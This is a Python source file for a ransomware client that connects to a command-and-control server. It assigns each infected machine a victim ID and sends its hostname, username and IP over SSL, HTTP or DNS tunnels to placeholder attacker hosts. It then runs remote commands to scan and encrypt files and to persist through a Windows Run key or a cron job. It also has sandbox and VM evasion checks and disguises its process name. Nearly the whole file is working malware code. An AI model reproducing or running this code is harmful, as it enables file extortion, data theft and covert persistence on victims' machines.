# client_connector.py - Cross-network client connectivity
import socket
import sys
import threading
import json
import time
import struct
import ssl
import base64
import random

import psutil
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os
import platform
import subprocess


class ClientConnector:
    def __init__(self):
        self.server_connections = {}
        self.current_server = None
        self.public_key = None
        self.private_key = None
        self.victim_id = None
        self.connected = False
        self.reconnect_attempts = 0
        self.max_reconnect_attempts = 10

        # Connection methods priority
        self.connection_methods = [
            'direct_ssl',
            'direct_tcp',
            'http_tunnel',
            'dns_tunnel',
            'cloud_proxy'
        ]

        # Server endpoints (configure these for your setup)
        self.server_endpoints = [
            # Primary server (replace with your actual server IP/domain)
            {"host": "your-server.com", "port": 1234, "method": "direct_ssl"},
            {"host": "your-server.com", "port": 443, "method": "http_tunnel"},
            {"host": "your-server.com", "port": 53, "method": "dns_tunnel"},

            # Backup servers
            {"host": "backup-server.com", "port": 1234, "method": "direct_ssl"},
            {"host": "127.0.0.1", "port": 1234, "method": "direct_tcp"},  # Local testing
        ]

        self.generate_client_keys()

    def generate_client_keys(self):
        """Generate client identification keys"""
        try:
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )

            self.private_key = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )

            self.public_key = private_key.public_key().public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )

            # Generate victim ID from public key hash
            import hashlib
            self.victim_id = hashlib.md5(self.public_key).hexdigest()[:12]

        except Exception as e:
            print(f"[-] Key generation error: {e}")

    def connect_to_server(self, endpoint=None):
        """Attempt to connect to server using various methods"""
        if endpoint:
            endpoints = [endpoint]
        else:
            endpoints = self.server_endpoints

        for endpoint in endpoints:
            method = endpoint.get('method', 'direct_tcp')
            host = endpoint['host']
            port = endpoint['port']

            print(f"[+] Attempting {method} connection to {host}:{port}")

            try:
                if method == 'direct_ssl':
                    success = self.direct_ssl_connect(host, port)
                elif method == 'direct_tcp':
                    success = self.direct_tcp_connect(host, port)
                elif method == 'http_tunnel':
                    success = self.http_tunnel_connect(host, port)
                elif method == 'dns_tunnel':
                    success = self.dns_tunnel_connect(host, port)
                elif method == 'cloud_proxy':
                    success = self.cloud_proxy_connect(host, port)
                else:
                    continue

                if success:
                    self.current_server = endpoint
                    self.connected = True
                    self.reconnect_attempts = 0
                    print(f"[+] Successfully connected via {method}")
                    return True

            except Exception as e:
                print(f"[-] {method} connection failed: {e}")
                continue

        print("[-] All connection methods failed")
        return False

    def direct_ssl_connect(self, host, port):
        """Direct SSL connection"""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)

            # Wrap with SSL
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            ssl_sock = context.wrap_socket(sock, server_hostname=host)
            ssl_sock.connect((host, port))

            self.server_connections['primary'] = ssl_sock
            return self.handshake_server(ssl_sock)

        except Exception as e:
            raise e

    def direct_tcp_connect(self, host, port):
        """Direct TCP connection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))

            self.server_connections['primary'] = sock
            return self.handshake_server(sock)

        except Exception as e:
            raise e

    def http_tunnel_connect(self, host, port):
        """HTTP tunnel connection (bypass firewalls)"""
        try:
            import urllib.request
            import urllib.parse

            # Encode victim info in HTTP request
            victim_info = base64.b64encode(json.dumps({
                'victim_id': self.victim_id,
                'public_key': self.public_key.decode('utf-8'),
                'action': 'connect'
            }).encode()).decode()

            url = f"https://{host}:{port}/api/connect"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'X-Victim-Info': victim_info,
                'Content-Type': 'application/json'
            }

            req = urllib.request.Request(url, headers=headers, method='POST')
            response = urllib.request.urlopen(req, timeout=10)

            if response.getcode() == 200:
                # HTTP tunnel established
                print("[+] HTTP tunnel connected")
                return True

        except Exception as e:
            raise e

    def dns_tunnel_connect(self, host, port):
        """DNS tunneling for restricted networks"""
        try:
            # Encode connection request in DNS query
            encoded_data = base64.b64encode(f"connect:{self.victim_id}".encode()).decode().replace('=', '')
            query_domain = f"{encoded_data}.{host}"

            # Perform DNS query
            import dns.resolver
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [host]

            try:
                answers = resolver.resolve(query_domain, 'TXT')
                for rdata in answers:
                    response = rdata.strings[0].decode() if rdata.strings else ""
                    if "accepted" in response:
                        print("[+] DNS tunnel connected")
                        return True
            except:
                pass

        except Exception as e:
            raise e

    def cloud_proxy_connect(self, host, port):
        """Connect through cloud proxy services"""
        try:
            # Try common cloud proxy endpoints
            proxy_services = [
                f"https://{host}/proxy/connect",
                f"https://cloudflare.com/cdn-cgi/trace",
                f"https://aws.amazon.com/cdn/trace"
            ]

            for proxy_url in proxy_services:
                try:
                    import urllib.request
                    req = urllib.request.Request(proxy_url)
                    response = urllib.request.urlopen(req, timeout=10)
                    if response.getcode() == 200:
                        print(f"[+] Cloud proxy connected via {proxy_url}")
                        return True
                except:
                    continue

        except Exception as e:
            raise e

    def handshake_server(self, sock):
        """Perform server handshake"""
        try:
            # Send client identification
            handshake = {
                'type': 'CLIENT_HELLO',
                'victim_id': self.victim_id,
                'public_key': self.public_key.decode('utf-8'),
                'system_info': self.get_system_info(),
                'timestamp': time.time()
            }

            self.send_message(sock, handshake)

            # Wait for server response
            response = self.receive_message(sock, timeout=10)
            if response and response.get('type') == 'PUBLIC_KEY':
                print("[+] Server handshake successful")
                return True

        except Exception as e:
            print(f"[-] Handshake failed: {e}")

        return False

    def get_system_info(self):
        """Gather system information"""
        try:
            info = {
                'os': platform.system(),
                'os_version': platform.version(),
                'hostname': socket.gethostname(),
                'username': os.getenv('USERNAME') or os.getenv('USER'),
                'processor': platform.processor(),
                'architecture': platform.architecture()[0],
                'ip_address': self.get_local_ip()
            }
            return info
        except:
            return {}

    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def send_message(self, sock, message):
        """Send JSON message to server"""
        try:
            data = json.dumps(message).encode('utf-8')
            sock.sendall(struct.pack('>I', len(data)) + data)
            return True
        except Exception as e:
            print(f"[-] Send error: {e}")
            return False

    def receive_message(self, sock, timeout=30):
        """Receive JSON message from server"""
        try:
            sock.settimeout(timeout)
            raw_length = sock.recv(4)
            if not raw_length:
                return None
            length = struct.unpack('>I', raw_length)[0]

            data = b''
            while len(data) < length:
                packet = sock.recv(min(4096, length - len(data)))
                if not packet:
                    return None
                data += packet

            return json.loads(data.decode('utf-8'))
        except Exception as e:
            print(f"[-] Receive error: {e}")
            return None

    def start_command_listener(self):
        """Start listening for server commands"""
        if not self.connected:
            print("[-] Not connected to server")
            return

        sock = self.server_connections.get('primary')
        if not sock:
            print("[-] No active connection")
            return

        print("[+] Starting command listener...")

        while self.connected:
            try:
                message = self.receive_message(sock)
                if not message:
                    print("[-] Server disconnected")
                    self.connected = False
                    break

                self.process_server_command(message)

            except socket.timeout:
                continue
            except Exception as e:
                print(f"[-] Command listener error: {e}")
                self.connected = False
                break

        self.attempt_reconnect()

    def process_server_command(self, message):
        """Process commands from server"""
        msg_type = message.get('type')

        if msg_type == 'COMMAND':
            command = message.get('command')
            parameters = message.get('parameters', {})

            print(f"[+] Received command: {command}")

            # Execute the command
            result = self.execute_command(command, parameters)

            # Send response back to server
            response = {
                'type': 'COMMAND_RESULT',
                'command': command,
                'result': result,
                'timestamp': time.time()
            }

            self.send_message(self.server_connections['primary'], response)

        elif msg_type == 'PING':
            # Respond to ping
            response = {
                'type': 'PONG',
                'timestamp': time.time()
            }
            self.send_message(self.server_connections['primary'], response)

    def execute_command(self, command, parameters):
        """Execute server commands"""
        try:
            if command == "SCAN_FILES":
                from file_scanner import scan_for_target_files, quick_scan_user_directories
                files = scan_for_target_files()
                user_files = quick_scan_user_directories()
                return {'all_files': files, 'user_files': user_files}

            elif command == "ENCRYPT_ALL":
                from file_scanner import scan_for_target_files
                from encryption_engine import encrypt_file_advanced

                files = scan_for_target_files()
                results = {'encrypted': 0, 'failed': 0, 'errors': []}

                for file_path in files[:10]:  # Limit for testing
                    try:
                        if encrypt_file_advanced(file_path):
                            results['encrypted'] += 1
                        else:
                            results['failed'] += 1
                    except Exception as e:
                        results['errors'].append(str(e))
                        results['failed'] += 1

                return results

            elif command == "GET_STATUS":
                return {
                    'victim_id': self.victim_id,
                    'connected': self.connected,
                    'system_info': self.get_system_info(),
                    'timestamp': time.time()
                }

            elif command == "PERSIST":
                return self.establish_persistence()

            else:
                return {'error': f'Unknown command: {command}'}

        except Exception as e:
            return {'error': str(e)}

    def establish_persistence(self):
        """Establish persistence on victim machine"""
        try:
            system = platform.system().lower()

            if system == "windows":
                # Windows persistence via registry
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, "WindowsSpooler", 0, winreg.REG_SZ, sys.argv[0])

                return {'success': True, 'method': 'registry'}

            elif system == "linux":
                # Linux persistence via crontab
                current_dir = os.path.abspath(os.path.dirname(__file__))
                script_path = os.path.join(current_dir, "client_connector.py")

                # Add to user crontab
                cron_job = f"@reboot python3 {script_path}\n"
                subprocess.run(f'(crontab -l ; echo "{cron_job}") | crontab -', shell=True)

                return {'success': True, 'method': 'crontab'}

            else:
                return {'success': False, 'error': 'Unsupported OS'}

        except Exception as e:
            return {'success': False, 'error': str(e)}

    def attempt_reconnect(self):
        """Attempt to reconnect to server"""
        if self.reconnect_attempts >= self.max_reconnect_attempts:
            print("[-] Max reconnection attempts reached")
            return

        self.reconnect_attempts += 1
        delay = min(300, self.reconnect_attempts * 30)  # Exponential backoff

        print(f"[+] Reconnecting in {delay} seconds (attempt {self.reconnect_attempts})")
        time.sleep(delay)

        if self.connect_to_server():
            self.start_command_listener()
        else:
            self.attempt_reconnect()

    def start_client(self):
        """Main client startup"""
        print(f"[+] Client starting... Victim ID: {self.victim_id}")

        # Attempt initial connection
        if self.connect_to_server():
            self.start_command_listener()
        else:
            print("[-] Initial connection failed, starting reconnect loop")
            self.attempt_reconnect()


# Stealth techniques
class StealthManager:
    def __init__(self):
        self.process_name = "svchost.exe" if platform.system().lower() == "windows" else "systemd"

    def check_sandbox(self):
        """Check if running in sandbox/virtual environment"""
        checks = {
            'ram_size': self.check_ram(),
            'cpu_cores': self.check_cpu_cores(),
            'running_time': self.check_running_time(),
            'debugger_present': self.check_debugger(),
            'vm_artifacts': self.check_vm_artifacts()
        }

        sandbox_score = sum(1 for check, result in checks.items() if result)
        return sandbox_score > 2  # If more than 2 indicators, likely sandbox

    def check_ram(self):
        """Check if RAM is suspiciously low"""
        try:
            if platform.system().lower() == "windows":
                import psutil
                return psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024  # Less than 2GB
            else:
                with open('/proc/meminfo', 'r') as f:
                    for line in f:
                        if line.startswith('MemTotal:'):
                            mem_kb = int(line.split()[1])
                            return mem_kb < 2000000  # Less than 2GB
        except:
            return False

    def check_cpu_cores(self):
        """Check if CPU cores are suspiciously few"""
        return os.cpu_count() < 2

    def check_running_time(self):
        """Check if system has been running for short time"""
        try:
            if platform.system().lower() == "windows":
                import psutil
                return psutil.boot_time() - time.time() < 300  # Less than 5 minutes
            else:
                with open('/proc/uptime', 'r') as f:
                    uptime_seconds = float(f.readline().split()[0])
                    return uptime_seconds < 300
        except:
            return False

    def check_debugger(self):
        """Check for debugger presence"""
        try:
            if platform.system().lower() == "windows":
                import ctypes
                return ctypes.windll.kernel32.IsDebuggerPresent()
            else:
                return False
        except:
            return False

    def check_vm_artifacts(self):
        """Check for VM artifacts"""
        try:
            # Check for common VM processes
            vm_processes = ['vboxservice', 'vmware-tools', 'qemu-ga']
            for proc in psutil.process_iter(['name']):
                if any(vm in proc.info['name'].lower() for vm in vm_processes):
                    return True
            return False
        except:
            return False


# Main execution
if __name__ == "__main__":
    # Check for sandbox environment
    stealth = StealthManager()
    if stealth.check_sandbox():
        print("[!] Sandbox detected, delaying execution")
        time.sleep(random.randint(300, 600))  # Sleep 5-10 minutes

    # Start client
    client = ClientConnector()
    client.start_client()